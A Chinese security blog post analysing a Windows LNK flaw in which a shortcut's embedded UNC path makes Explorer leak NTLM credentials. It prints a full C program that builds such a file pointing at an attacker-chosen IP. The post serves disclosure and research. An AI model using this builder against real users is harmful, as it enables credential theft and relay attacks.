#  右键点击就能窃取 NTLM 密码？- 技术分析与 PoC   
原创 骨哥说事  骨哥说事   2025-04-30 07:11  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/4224  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
# 起因  
  
相信大家还记得前两天的这篇文章：  
  
[无需交互即可攻破？CVE-2025-24054正被利用绕过Windows身份验证"](https://mp.weixin.qq.com/s?__biz=MjM5Mzc4MzUzMQ==&mid=2650260929&idx=1&sn=2f8d14dd48df42d04bd14ad8ca9e9b22&scene=21#wechat_redirect)  
  
  
昨天又被爆出“  
利用NTLM身份验证绕过实现登录Microsoft Telnet服务器”，  
并且POC已公布，且官方暂无修复补丁。  
  
于是该漏洞就在网上引起热议，其中一位名叫 @nafiez 的网友在上个月的时候，就向 MSRC 报告了 LNK 文件的潜在安全问题，但微软认为该问题依赖于 MOTW（**Mark of the Web，Windows 系统用来标记从互联网或不受信任来源下载的文件的一种机制**  
） ，因此并不打算修复。于是该网友就公布了漏洞分析以及 PoC 的详细信息。  
# 原因分析  
  
**（纯技术，不想看的可直接跳过）**  
  
虽然 MOTW 确实为来自不可信来源的文件提供了一个额外的安全层，但它也提出了一些问题，比如这种保护可能会被绕过，或者 LNK 文件也可以通过不触发 MOTW 的其它载体进行传输。  
  
一直以来，Windows LNK 文件的安全问题都存在争议，它允许攻击者创建恶意的快捷方式来执行命令，同时对于用户来说看起来是“友好”的。  
  
那么利用 LNK 文件结构中的特定位，特别是 HasArguments 标志和带有 UNC 路径的 EnvironmentVariableDataBlock，再结合该漏洞，就能控制执行流程。  
  
EnvironmentVariableDataBlock 看起来非常敏感，你必须将块大小设置为788字节（0x00000314），并且必须设置环境变量数据块的签名，即0xA0000001。  
  
一旦设置这些，就可以为TargetAnsi分配260字节的缓冲区大小，为TargetUnicode分配520字节的缓冲区大小，这就是稍后执行LNK时调用envPath的地方，并调用COMMAND_LINE_ARGUMENTS中的其余参数。在这种情况下，需要在LinkFlags中启用IsUnicode标志，这意味着我们的参数将以Unicode方式调用和执行。  
  
此处 envPath 是支持 UNC 的，我们可以直接调用所需的 UNC 路径，因此，当把变量 envUNC 赋给 UNC 路径时，我们必须在分配 TargetUnicode 空间时设置它。我们的 TargetUnicode 值将作为 UNC 路径的一部分包含在内。技术上，此代码使用其参数创建了带有UNC的EnvironmentVariableDataBlock。  
```
  const char* envUNC = "\\\\<IP Address Here>\\c";    DWORD envBlockSize = 0x00000314;    DWORD envSignature = ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;    if (!WriteFile(hFile, &envBlockSize, sizeof(DWORD), &bytesWritten, NULL)) {        printf("Failed to write env block size: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    if (!WriteFile(hFile, &envSignature, sizeof(DWORD), &bytesWritten, NULL)) {        printf("Failed to write env block signature: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    char ansiBuffer[260] = { 0 };    strncpy(ansiBuffer, envUNC, 259);    if (!WriteFile(hFile, ansiBuffer, 260, &bytesWritten, NULL)) {        printf("Failed to write TargetAnsi: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    WCHAR unicodeBuffer[260] = { 0 };    if (MultiByteToWideChar(CP_ACP, 0, envUNC, -1, unicodeBuffer, 260) == 0) {        printf("Failed to convert to Unicode: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    if (!WriteFile(hFile, unicodeBuffer, 520, &bytesWritten, NULL)) {        printf("Failed to write TargetUnicode: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }
```  
  
如果我们编译程序并执行 LNK 构建器，我们会在 LNK 文件结构中看到类似这样的内容，并且我们的 EnvironmentVariableDataBlock 被分配了 UNC 路径：  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jngC9wEjt96d1gNwAVgUHNPeyUNicoeON5eudHfZxucibRbLEWKvkXOruuSiagYXSCCePRWZ1uIL6FLA/640?wx_fmt=png&from=appmsg "")  
  
file  
  
为了进一步理解，我们需要在资源管理器上下文中追踪解析的执行流程。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jngC9wEjt96d1gNwAVgUHNPvKJB2wjWX47QnXB7QRjpzDwm7QKto4B8gVYN0bcS7hhrozkDhRS1sQ/640?wx_fmt=png&from=appmsg "")  
  
file  
  
可以看到 Windows 将 UNC 路径分解为其组成部分，系统正在搜索反斜杠字符以将服务器名（192.168.44.128）与共享名（c）分开。  
  
这种解析对于确定如何访问网络资源至关重要，带有 SHGDN_FORPARSING 标志的这些调用表明 Windows 正在请求 shell 项的完整解析路径。  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jngC9wEjt96d1gNwAVgUHNPW4vtcnmPxYb41SZictBMFaOdYjZWZrKrRb8EhCYE3agtSgojkPpd8zg/640?wx_fmt=png&from=appmsg "")  
  
file  
  
查询接口调用请求接口GUID {94727de2-b2ed-41b5-9eb5-0939ea9d0efc}，该GUID对应于IShellFolder2。此高级文件夹接口扩展了基本的IShellFolder接口，增加了以下功能：  
- 检索扩展属性信息  
  
- 管理资源管理器视图的列详细信息  
  
- 处理 shell 项的自定义属性 这个接口链（IInitializeNetworkFolder → IShellFolder2）揭示了 Windows 是如何建立一个分层抽象来处理网络资源的，每一层都增加了专门的功能。  
  
IInitializeNetworkFolder 是 Windows Shell API 中一个专门用于处理网络资源的 COM 接口。  
  
该接口是 Windows 内部架构的一部分，用于表示网络位置并与之交互，它可以初始化表示网络资源（共享、计算机、打印机）的 shell 文件夹对象。当你在资源管理器中访问网络资源时，会发生以下过程：  
- 资源管理器检测到你正在访问网络路径  
  
- 然后创建一个 shell 文件夹对象来表示此网络位置  
  
- 这里将通过 IInitializeNetworkFolder::Initialize() 初始化对象  
  
然后，初始化的对象随后将有关网络资源的信息反馈给资源管理器， IInitializeNetworkFolder 为显示和访问对象做好准备。  
# PoC  
  
所以当用户访问包含 LNK 文件的文件夹时，资源管理器会解析文件夹中存储的任何文件并识别出是哪个文件等，当它成功识别出文件类型，例如 LNK 时，它会解析 LNK 并尝试理解 LNK 的结构。  
  
当用户访问包含 LNK 文件的文件夹时，资源管理器会解析文件夹中存储的任何文件并识别出是哪个文件。  
  
例如调用/执行 UNC 路径。然后当用户右键单击 LNK 文件时，资源管理器已经知道该文件初始化到了网络文件夹。  
  
PoC 代码如下：  
```
#include <windows.h>#include <stdio.h>#pragma pack(1)#pragma warning(disable:4996)typedefstruct _ShellLinkHeader {    DWORD       HeaderSize;          GUID        LinkCLSID;           DWORD       LinkFlags;           DWORD       FileAttributes;      FILETIME    CreationTime;        FILETIME    AccessTime;          FILETIME    WriteTime;           DWORD       FileSize;            DWORD       IconIndex;           DWORD       ShowCommand;         WORD        HotKey;              WORD        Reserved1;           DWORD       Reserved2;           DWORD       Reserved3;       } SHELL_LINK_HEADER, * PSHELL_LINK_HEADER;#define HAS_LINK_TARGET_IDLIST         0x00000001#define HAS_LINK_INFO                  0x00000002#define HAS_NAME                       0x00000004#define HAS_RELATIVE_PATH              0x00000008#define HAS_WORKING_DIR                0x00000010#define HAS_ARGUMENTS                  0x00000020#define HAS_ICON_LOCATION              0x00000040#define IS_UNICODE                     0x00000080#define FORCE_NO_LINKINFO              0x00000100#define HAS_EXP_STRING                 0x00000200#define RUN_IN_SEPARATE_PROCESS        0x00000400#define HAS_LOGO3ID                    0x00000800#define HAS_DARWIN_ID                  0x00001000#define RUN_AS_USER                    0x00002000#define HAS_EXP_ICON                   0x00004000#define NO_PIDL_ALIAS                  0x00008000#define FORCE_USHORTCUT                0x00010000#define RUN_WITH_SHIMLAYER             0x00020000#define FORCE_NO_LINKTRACK             0x00040000#define ENABLE_TARGET_METADATA         0x00080000#define DISABLE_LINK_PATH_TRACKING     0x00100000#define DISABLE_KNOWNFOLDER_TRACKING   0x00200000#define DISABLE_KNOWNFOLDER_ALIAS      0x00400000#define ALLOW_LINK_TO_LINK             0x00800000#define UNALIAS_ON_SAVE                0x01000000#define PREFER_ENVIRONMENT_PATH        0x02000000#define KEEP_LOCAL_IDLIST_FOR_UNC      0x04000000#pragma pack()#define SW_SHOWNORMAL       0x00000001#define SW_SHOWMAXIMIZED    0x00000003#define SW_SHOWMINNOACTIVE  0x00000007#define ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE   0xA0000001#define CONSOLE_DATABLOCK_SIGNATURE                   0xA0000002#define TRACKER_DATABLOCK_SIGNATURE                   0xA0000003#define CONSOLE_PROPS_DATABLOCK_SIGNATURE             0xA0000004#define SPECIAL_FOLDER_DATABLOCK_SIGNATURE            0xA0000005#define DARWIN_DATABLOCK_SIGNATURE                    0xA0000006#define ICON_ENVIRONMENT_DATABLOCK_SIGNATURE          0xA0000007#define SHIM_DATABLOCK_SIGNATURE                      0xA0000008#define PROPERTY_STORE_DATABLOCK_SIGNATURE            0xA0000009#define KNOWN_FOLDER_DATABLOCK_SIGNATURE              0xA000000B#define VISTA_AND_ABOVE_IDLIST_DATABLOCK_SIGNATURE    0xA000000C#define EMBEDDED_EXE_DATABLOCK_SIGNATURE              0xA000CAFEint main() {    constchar* lnkFilePath = "poc.lnk";    HANDLE hFile;    DWORD bytesWritten;    hFile = CreateFileA(lnkFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,        FILE_ATTRIBUTE_NORMAL, NULL);    if (hFile == INVALID_HANDLE_VALUE) {        printf("Failed to create LNK file: %lu\n", GetLastError());        return1;    }    SHELL_LINK_HEADER header = { 0 };    header.HeaderSize = 0x0000004C;    header.LinkCLSID.Data1 = 0x00021401;    header.LinkCLSID.Data2 = 0x0000;    header.LinkCLSID.Data3 = 0x0000;    header.LinkCLSID.Data4[0] = 0xC0;    header.LinkCLSID.Data4[1] = 0x00;    header.LinkCLSID.Data4[2] = 0x00;    header.LinkCLSID.Data4[3] = 0x00;    header.LinkCLSID.Data4[4] = 0x00;    header.LinkCLSID.Data4[5] = 0x00;    header.LinkCLSID.Data4[6] = 0x00;    header.LinkCLSID.Data4[7] = 0x46;    header.LinkFlags = HAS_NAME |        HAS_ARGUMENTS |        HAS_ICON_LOCATION |        IS_UNICODE |        HAS_EXP_STRING;    header.FileAttributes = FILE_ATTRIBUTE_NORMAL;    SYSTEMTIME st;    GetSystemTime(&st);    SystemTimeToFileTime(&st, &header.CreationTime);    SystemTimeToFileTime(&st, &header.AccessTime);    SystemTimeToFileTime(&st, &header.WriteTime);    header.FileSize = 0;    header.IconIndex = 0;    header.ShowCommand = SW_SHOWNORMAL;    header.HotKey = 0;    header.Reserved1 = 0;    header.Reserved2 = 0;    header.Reserved3 = 0;    if (!WriteFile(hFile, &header, sizeof(SHELL_LINK_HEADER), &bytesWritten, NULL)) {        printf("Failed to write header: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    constchar* description = "testing purpose";    WORD descLen = (WORD)strlen(description);    if (!WriteFile(hFile, &descLen, sizeof(WORD), &bytesWritten, NULL)) {        printf("Failed to write description length: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    int wideBufSize = MultiByteToWideChar(CP_ACP, 0, description, -1, NULL, 0);    WCHAR* wideDesc = (WCHAR*)malloc(wideBufSize * sizeof(WCHAR));    if (!wideDesc) {        printf("Memory allocation failed\n");        CloseHandle(hFile);        return1;    }    MultiByteToWideChar(CP_ACP, 0, description, -1, wideDesc, wideBufSize);    if (!WriteFile(hFile, wideDesc, descLen * sizeof(WCHAR), &bytesWritten, NULL)) {        printf("Failed to write description: %lu\n", GetLastError());        free(wideDesc);        CloseHandle(hFile);        return1;    }    free(wideDesc);    constchar* calcCmd = "";    char cmdLineBuffer[1024] = { 0 };    int cmdLen = strlen(calcCmd);    int fillBytes = 900 - cmdLen;    memset(cmdLineBuffer, 0x20, fillBytes);    strcpy(cmdLineBuffer + fillBytes, calcCmd);    cmdLineBuffer[900] = '\0';    WORD cmdArgLen = (WORD)strlen(cmdLineBuffer);    if (!WriteFile(hFile, &cmdArgLen, sizeof(WORD), &bytesWritten, NULL)) {        printf("Failed to write cmd length: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    int wideCmdBufSize = MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, NULL, 0);    WCHAR* wideCmd = (WCHAR*)malloc(wideCmdBufSize * sizeof(WCHAR));    if (!wideCmd) {        printf("Memory allocation failed\n");        CloseHandle(hFile);        return1;    }    MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, wideCmd, wideCmdBufSize);    if (!WriteFile(hFile, wideCmd, cmdArgLen * sizeof(WCHAR), &bytesWritten, NULL)) {        printf("Failed to write cmd: %lu\n", GetLastError());        free(wideCmd);        CloseHandle(hFile);        return1;    }    free(wideCmd);    constchar* iconPath = "path\\to\\your\\icon";    WORD iconLen = (WORD)strlen(iconPath);    if (!WriteFile(hFile, &iconLen, sizeof(WORD), &bytesWritten, NULL)) {        printf("Failed to write icon length: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    int wideIconBufSize = MultiByteToWideChar(CP_ACP, 0, iconPath, -1, NULL, 0);    WCHAR* wideIcon = (WCHAR*)malloc(wideIconBufSize * sizeof(WCHAR));    if (!wideIcon) {        printf("Memory allocation failed\n");        CloseHandle(hFile);        return1;    }    MultiByteToWideChar(CP_ACP, 0, iconPath, -1, wideIcon, wideIconBufSize);    if (!WriteFile(hFile, wideIcon, iconLen * sizeof(WCHAR), &bytesWritten, NULL)) {        printf("Failed to write icon path: %lu\n", GetLastError());        free(wideIcon);        CloseHandle(hFile);        return1;    }    free(wideIcon);    constchar* envUNC = "\\\\<IP address here>\\c";    DWORD envBlockSize = 0x00000314;    DWORD envSignature = ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;    printf("Creating Environment Variables Data Block:\n");    printf("  Using fixed block size: 0x%08X (%lu bytes)\n", envBlockSize, envBlockSize);    if (!WriteFile(hFile, &envBlockSize, sizeof(DWORD), &bytesWritten, NULL)) {        printf("Failed to write env block size: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    printf("  Write block size: %lu bytes written\n", bytesWritten);    if (!WriteFile(hFile, &envSignature, sizeof(DWORD), &bytesWritten, NULL)) {        printf("Failed to write env block signature: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    printf("  Wrote block signature: %lu bytes written\n", bytesWritten);    char ansiBuffer[260] = { 0 };    strncpy(ansiBuffer, envUNC, 259);    if (!WriteFile(hFile, ansiBuffer, 260, &bytesWritten, NULL)) {        printf("Failed to write TargetAnsi: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    printf("  Write TargetAnsi: %lu bytes written (fixed 260 bytes)\n", bytesWritten);    WCHAR unicodeBuffer[260] = { 0 };    if (MultiByteToWideChar(CP_ACP, 0, envUNC, -1, unicodeBuffer, 260) == 0) {        printf("Failed to convert to Unicode: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    if (!WriteFile(hFile, unicodeBuffer, 520, &bytesWritten, NULL)) {        printf("Failed to write TargetUnicode: %lu\n", GetLastError());        CloseHandle(hFile);        return1;    }    printf("  Write TargetUnicode: %lu bytes written (fixed 520 bytes)\n", bytesWritten);    CloseHandle(hFile);    printf("LNK file created successfully: %s\n", lnkFilePath);    printf("Command line buffer size: %d bytes\n", (int)strlen(cmdLineBuffer));    return0;}
```  
# 视频演示  
  
  
原文：https://zeifan.my/Right-Click-LNK/  
  
- END -  
  
  
**加入星球，随时交流：**  
  
**********（会员统一定价）：128元/年（0.35元/天）******  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～**  
  
